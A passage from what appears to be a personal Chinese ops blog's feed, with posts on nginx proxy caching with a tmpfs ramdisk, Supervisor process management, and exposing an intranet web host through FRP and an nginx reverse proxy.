Cache-Control;   </span><br><span class="line">    <span class="attribute">proxy_set_header</span>            X-real-ip <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>            X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">proxy_pass</span> https://frpcon;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Use Proxy Cache</span></span><br><span class="line">    <span class="attribute">proxy_cache</span> my_zone;<span class="comment"># 缓存空间指定</span></span><br><span class="line">    <span class="attribute">proxy_cache_key</span> <span class="string">"<span class="variable">$host</span><span class="variable">$request_uri</span>"</span>; <span class="comment"># 键存储方式  </span></span><br><span class="line">    <span class="attribute">add_header</span> Cache <span class="string">"<span class="variable">$upstream_cache_status</span>"</span>; <span class="comment"># 返回头添加字段，说明命中状态</span></span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  <span class="number">200</span> <span class="number">304</span> <span class="number">301</span> <span class="number">302</span> <span class="number">8h</span>;<span class="comment"># 不同返回码的有效时间</span></span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  <span class="number">404</span> <span class="number">1m</span>;</span><br><span class="line">    <span class="attribute">proxy_cache_valid</span>  any <span class="number">2d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjY4MDQ1Mw==" title="https://segmentfault.com/a/1190000012680453">nginx proxy cache配置参数解读<i class="fa fa-external-link"></i></span> 这里是一篇 相关配置参数的说明</p></blockquote><hr><p>如上配置完成之后，reload server ，缓存功能理应启动。</p><h2 id="热数据思想"><a href="#热数据思想" class="headerlink" title="热数据思想"></a>热数据思想</h2><p>冷热数据分离的思想，常伴在身，虽然这里的请求量是微乎其微，不过还是建一个概念功能。Cache 的请求量一定是非常高的，所以才会被 cache。涉及到IO的时候，最快的设备可能就是我们的内存了。</p><p>所以这里直接使用<strong>内存盘</strong> 对数据来进行缓存，这样的化，大大的降低了物理磁盘的IO量，而且也大大提升了缓存性能。</p><hr><p>在linux下实现一个内存盘是相当的简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/ramdisk# 创建挂载点</span><br><span class="line">mount  -t tmpfs -o size=64m  myramdisk /tmp/ramdisk # 实现内存盘挂载</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###### 测速 #####</span></span></span><br><span class="line">➜  /tmp sudo dd if=/dev/zero of=/tmp/ramdisk/zero bs=4k count=100</span><br><span class="line">100+0 records in</span><br><span class="line">100+0 records out</span><br><span class="line">409600 bytes (410 kB) copied, 0.000243897 s, 1.7 GB/s</span><br></pre></td></tr></table></figure><p>这里顺便进行了测速，可见速度还是相当的满意的。至此内存盘的配置完毕。</p><hr><p>当然如果要实现自动挂载，需要在 <code>fstab</code> 里面进行配置.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myramdisk/tmp/ramdisktmpfsdefaults00</span><br></pre></td></tr></table></figure><p>至此配置完毕。</p><h2 id="命中率统计"><a href="#命中率统计" class="headerlink" title="命中率统计"></a>命中率统计</h2><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><p>关于命中率的统计这里还是通过在日志里面实现的。和之前的一篇一样，通过 shell 脚本对日志进行提取得到我们需要的数据。</p><p>不过在这里，需要对日志个事进行设定，使其能提供我们需要的信息：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  proxy <span class="string">'<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] "<span class="variable">$request</span>" '</span></span><br><span class="line"><span class="string">'<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> "<span class="variable">$http_referer</span>" '</span></span><br><span class="line"><span class="string">'"<span class="variable">$http_user_agent</span>" "<span class="variable">$http_x_forwarded_for</span>"'</span></span><br><span class="line"><span class="string">'"<span class="variable">$request_time</span>" "<span class="variable">$upstream_response_time</span>" "<span class="variable">$upstream_cache_status</span>" "<span class="variable">$upstream_addr</span>"'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">access_log</span> xxxx proxy;<span class="comment"># 这里对格式进行指定。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在我们的HTTP域里面自定义日志类型</p><h3 id="统计脚本"><a href="#统计脚本" class="headerlink" title="统计脚本"></a>统计脚本</h3><p>学好 awk ，走遍天下都不怕。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;if($(NF-1)=="\"HIT\"") hit++&#125; END &#123;printf "%.4f%",hit/NR&#125;' /var/log/nginx/xxx.log</span><br></pre></td></tr></table></figure><p>这里，就很精巧的实现了对缓存命中率的统计。后面可以直接合并入之前的接口之中即可。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>慢慢装起来一辆能跑快的车，还是不错的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;车能跑之后，就希望跑的快点对吧？所以就想办法开始对其性能进行优化。 这里就使用 CDN的思想，对代理的静态文件进行缓存，实现访问速度的提升。&lt;/p&gt;
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Supervisor 进程管理系统</title>
    <link href="https://blog.diglp.xyz/2019/02/23/OP_Supervisord/"/>
    <id>https://blog.diglp.xyz/2019/02/23/OP_Supervisord/</id>
    <published>2019-02-22T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>一台机器东西跑多了，就开始各种混乱了。如果是标准安装的注册了service 的还可以比较容易的进行管理。然而很多组件是后面直接下载二进制文件的。这里一个 <code>nohup</code> ，那里一个。最后只能 ps 找出来。如没运行了，有时候甚至找不到了。自启动也是。</p><p>所以这里就是用 Supervisor  进行统一的进程管理，对添加的进程，的启停，自启等都能有很方便的管理。这篇就做个 basic 的部署使用说明。</p><h2 id="部署及配置"><a href="#部署及配置" class="headerlink" title="部署及配置"></a>部署及配置</h2><p>debian 和 redhat 的风格各自不同，debian直接通过 <code>apt-get</code> 安装即可。redhat 使用pip安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><p>以上完成，就实现了安装过程。</p><hr><p>一共有两个部分 <code>supervisorctl</code> 和 <code>supervisord</code>。根据其命名可以看出来，一个是控制端，另一个是守护进程。先启动守护进程，并注册开机启动。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable supervisor.service# redhat</span><br><span class="line">update-rc.d supervisor enable# debian</span><br></pre></td></tr></table></figure><p>之后把进程跑起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ systemctl start supervisord.service               </span><br><span class="line">➜  ~ supervisorctl </span><br><span class="line"><span class="meta">supervisor&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>至此,配置没有问题，部署完成。</p><h2 id="进程配置"><a href="#进程配置" class="headerlink" title="进程配置"></a>进程配置</h2><p>在 <code>/etc/supervisord.d</code> 里面通过 ini文件（conf）进行统一的注册。示例注册如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[program:frps]</span></span><br><span class="line"><span class="attr">command</span>=/***/frp/frps -c frps_full.ini --log_file frps.log</span><br><span class="line"><span class="attr">directory</span>=/***/</span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">startsecs</span>=<span class="number">5</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">startretries</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">user</span>=root</span><br><span class="line"><span class="attr">redirect_stderr</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">stdout_logfile_maxbytes</span>=<span class="number">20</span>MB</span><br><span class="line"><span class="attr">stdout_logfile_backups</span>=<span class="number">5</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/data/logs/frps_stdout.log</span><br></pre></td></tr></table></figure><p>这样就完成了一个进程的注册。后面在 ctl 里面进行更新，和操作了，十分方便</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ supervisorctl </span><br><span class="line">frps                             RUNNING   pid 6607, uptime 6:14:01</span><br><span class="line">uwsgi                            RUNNING   pid 6606, uptime 6:14:01</span><br><span class="line"><span class="meta">supervisor&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>至此，一个进程注册完成</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这篇文章感觉水水的，不过，挺偏实用向，下面给出 supervisor 的官方手册</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3N1cGVydmlzb3JkLm9yZy9pbmRleC5odG1s" title="http://supervisord.org/index.html">Supervisor: A Process Control System<i class="fa fa-external-link"></i></span></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;一台机器东西跑多了，就开始各种混乱了。如果是标准安装的注册了service 的还可以比较容易的进行管理。然而很多组件是后面直接下载二进制文件的。这里
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Supervisor" scheme="https://blog.diglp.xyz/tags/Supervisor/"/>
    
  </entry>
  
  <entry>
    <title>另一次内网穿透(reverse proxy)</title>
    <link href="https://blog.diglp.xyz/2019/02/21/OP_%E5%8F%A6%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F(reverse%20proxy)/"/>
    <id>https://blog.diglp.xyz/2019/02/21/OP_另一次内网穿透(reverse proxy)/</id>
    <published>2019-02-20T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>很快这就是第二篇了，上篇信誓旦旦说的更好的方案，实际上，这里较比而已只是有了一点点改进XD</p><p>上一篇：<a href="https://blog.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel">愚蠢的内网穿透方案(tunnel)</a>/) &lt;– 在此</p><p>其目标和目的是一样的，实现页面的内网穿透，以及内网主机的反代。</p><h2 id="方案以及可行性"><a href="#方案以及可行性" class="headerlink" title="方案以及可行性"></a>方案以及可行性</h2><h3 id="可行性"><a href="#可行性" class="headerlink" title="可行性"></a>可行性</h3><p>如上面所说，实际上分了两个部分，内网穿透，以及反向代理。这里实际上有点混淆了一个概念。反向代理实际上是内网穿透的一个实现过程。之于正向代理不同，反向代理是代理服务器在上次，有请求之后，会把请求转发都后排的客户端，所以这就是反向代理的过程。</p><p>那么内网穿透呢？内网穿透是在反向代理的功能上更多了一层。上面提到反向代理，在有连接的时候，会把它直接转发到后面的客户端。但是在穿透这个情况下，内网主机是<strong>无法被公网主机所访问</strong>，从而无法传递请求了。所以我们在反向代理的前提下，<strong>使用客户端向服务器发起TCP长连接</strong>，这样就打通了，公网主机到内网主机之间的通道。从而实现了内网的穿透。</p><blockquote><p>内网穿透 = 反向代理 + 正向连接</p></blockquote><hr><p>下面又是一个反向代理，这个和前面不一样，是七层代理（也就是应用层）HTTP 的七层代理。对Http的请求进行转发。这个转发和上面不同。转发的服务是运行在内网的主机上的。其作用是对公网穿透的主机请求进行到同一内网的主机的转发。</p><p>这里就是实现的是对HTTP的请求的转发。转发主机与lb主机是在同一个可以访问的网段内的。</p><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>之于上次的傻傻的方法所不同，这次使用现成的轮子了，内网穿透这里直接使用 <code>FRP</code> （Fast reverse proxy）实现，FRP是一个简单易用的内网穿透工具。在公网主机上进行配置。实现内网主机的透传连接。把你穿透到公网主机的开放端口。实现内网主机在公网上的端口访问。</p><p>内网主机使用 <code>Nginx</code> 对目标主机进行 反代，并且把web端口开放在 <code>FRP</code> 的转发上。</p><p>至此方案设计完毕</p><h2 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h2><h3 id="FRP的部署"><a href="#FRP的部署" class="headerlink" title="FRP的部署"></a>FRP的部署</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9ibG9iL21hc3Rlci9SRUFETUVfemgubWQ=" title="https://github.com/fatedier/frp/blob/master/README_zh.md">FRP项目Readme<i class="fa fa-external-link"></i></span>  这里面对工具的部署和使用做了详尽的说明，我们直接下载对应架构的 FRP 进行使用即可。其中的功能很多。这里我们只需要用到其中的 TCP 透传的功能。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fatedier/frp.git</span><br></pre></td></tr></table></figure><p>之后直接 make ，就OK了，当然也是推荐使用现有的 Release的版本。</p><h3 id="Nginx-部署"><a href="#Nginx-部署" class="headerlink" title="Nginx 部署"></a>Nginx 部署</h3><p>Nginx 是在大多数的发行版里默认带有的组件，简单性能轻量。</p><h3 id="FRP配置-以及测试"><a href="#FRP配置-以及测试" class="headerlink" title="FRP配置 以及测试"></a>FRP配置 以及测试</h3><h4 id="FRP-配置"><a href="#FRP-配置" class="headerlink" title="FRP 配置"></a>FRP 配置</h4><p>这里只是用到了 FRP 的内穿功能，通过简单的配置文件实现：</p><p>服务端：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server_port</span> = *<span class="number">000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"></span><br><span class="line"><span class="attr">allow_ports</span> = <span class="number">2000</span>-<span class="number">3000</span>,<span class="number">3001</span>,<span class="number">3003</span>,<span class="number">4000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure><p>配置简单通俗易懂，配置监听端口，以及连接 token、</p><hr><p>客户端：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = ****.diglp.xyz</span><br><span class="line"><span class="attr">server_port</span> = *<span class="number">000</span></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ****</span><br></pre></td></tr></table></figure><p>这里是客户端的配置文件，比较核心的配置在其指定本地端口以及远程端口的两行。指本地的localhost的443端口透传到远程主机的 <code>****</code> 端口。</p><h4 id="FRP-测试连接"><a href="#FRP-测试连接" class="headerlink" title="FRP 测试连接"></a>FRP 测试连接</h4><p>服务端部署，使用 Nohup 使其在后台运行，当然可以注册一个 supervisor。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nohup ./frps -c frps_full.ini --log_file frps.log &amp;</span><br></pre></td></tr></table></figure><p>客户端连接，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frpc -c frpc_wan.ini &amp;</span><br></pre></td></tr></table></figure><hr><p>测试连接，这里使用 <code>nc -l</code> 对端口进行监听：</p><p>客户端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 443</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XGET localhost:**80</span><br></pre></td></tr></table></figure><p>以此模拟一个 GET 请求。之后在客户端得到如下结果，说明透传成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@vm:~/qspace $ nc -l 443</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: curl/7.29.0</span><br><span class="line">Host: localhost:**80</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure><hr><p>或者：客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@vm:~/qspace $ sudo python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br><span class="line">127.0.0.1 - - [20/Feb/2019 23:29:47] "GET / HTTP/1.1" 200 -</span><br></pre></td></tr></table></figure><p>服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  frp_0.23.2 curl -XGET localhost:**80</span><br><span class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Directory listing for /&lt;/title&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h2&gt;Directory listing for /&lt;/h2&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li&gt;&lt;a href="frp_0.24.1_linux_arm/"&gt;frp_0.24.1_linux_arm/&lt;/a&gt;</span><br><span class="line">                &lt;li&gt;&lt;a href="frp_0.24.1_linux_arm.tar.gz"&gt;frp_0.24.1_linux_arm.tar.gz&lt;/a&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>至此连接测试完成。FRP 功能测试正常。</p><h2 id="Nginx-配置以及测试"><a href="#Nginx-配置以及测试" class="headerlink" title="Nginx 配置以及测试"></a>Nginx 配置以及测试</h2><p>这里用到了 Nginx 的反代功能，在写正确的配置之时，后面也写自己在过程中的尝试和想法XD。</p><p>这里直接把配置贴上来了就</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl default_server;                             </span><br><span class="line">    <span class="attribute">server_name</span>  _;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load configuration files for the default server block.                </span></span><br><span class="line">    <span class="attribute">location</span> = / &#123;                                                           </span><br><span class="line">    <span class="comment">#internal;                                                              </span></span><br><span class="line">    <span class="comment">#return 403;                                                           </span></span><br><span class="line">    empty_gif;                                                             </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;                                                  </span><br><span class="line">    <span class="attribute">location</span> = /40x.html &#123;                                                 </span><br><span class="line">    &#125;                                                                          </span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;                                      </span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;                                                 </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl;                             </span><br><span class="line">    <span class="attribute">server_name</span>  <span class="regexp">xxxk.*</span>**<span class="regexp">*.diglp.xyz</span>;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.***.64.***;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;                                                                     </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">443</span> ssl ;                             </span><br><span class="line">    <span class="attribute">server_name</span>  <span class="regexp">bkjw.*</span>**<span class="regexp">*.diglp.xyz</span>;                                            </span><br><span class="line">    <span class="attribute">root</span>         /usr/share/nginx/html;                                     </span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>     /etc/nginx/ssl/mine.diglp.xyz.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/mine.diglp.xyz.key;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                        </span><br><span class="line">    <span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                               </span><br><span class="line">    <span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                           </span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;                                           </span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.***.13.***;</span><br><span class="line">    &#125;                                                                         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于这里的说明：</p><ul><li>由于域名没有备案，所以随随便便弄个自签证书，顶上去，先用着了。所以会显示不安全</li><li>配置文件从 模板 copy-paste 上来的，所以有些冗长</li><li>这里还撞上了名字服务的问题</li></ul><hr><p>配置完成后使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/nignx -s reload</span><br></pre></td></tr></table></figure><p>对其进行热重启就好了。理论上问题不大。</p><h2 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h2><p>这个架构十分的简单，也没有什么问题可言吧。好像是的，直接公网访问。即可</p><h2 id="可用性保证"><a href="#可用性保证" class="headerlink" title="可用性保证"></a>可用性保证</h2><p>由于条件问题，内网客户端并不能保证稳定以及可用性，为了可用性的保证，这里使用 云拨测，对目标 URL 进行定时请求，当有服务不可用时，及时的进行告警。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL2NhdC9hdmFpbFRhc2tMaXN0" title="https://console.cloud.tencent.com/cat/availTaskList">腾讯云-云拨测<i class="fa fa-external-link"></i></span> 现在是免费使用 Recommend</p></blockquote><h2 id="过程问题笔记"><a href="#过程问题笔记" class="headerlink" title="过程问题笔记"></a>过程问题笔记</h2><p>这部分，没什么太大营养。。。</p><h3 id="rewrite"><a href="#rewrite" class="headerlink" title="rewrite"></a>rewrite</h3><p>其实，在这整个搭建的过程中，遇到了一个很大的问题。什么呢？就是通过名字对页面进行访问和区分。比如 <code>adb.com/1</code> 和 <code>abc.com/2</code> <strong>分别转发到不同的</strong>。乍一看是很好实现的，直接 rewrite 就好了比如这样：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /phpMyAdmin &#123;</span><br><span class="line">    <span class="attribute">root</span> /var/services/web;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> /phpMyAdmin/disabled.html <span class="literal">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的确可以实现隐式的重定向，但是这里的核心问题，<strong>不是同源</strong>。所以这个方法直接 pass 掉了。</p><hr><h3 id="直接proxy-pass的问题"><a href="#直接proxy-pass的问题" class="headerlink" title="直接proxy_pass的问题"></a>直接proxy_pass的问题</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /bkjw/ &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.*.13.*;</span><br><span class="line"><span 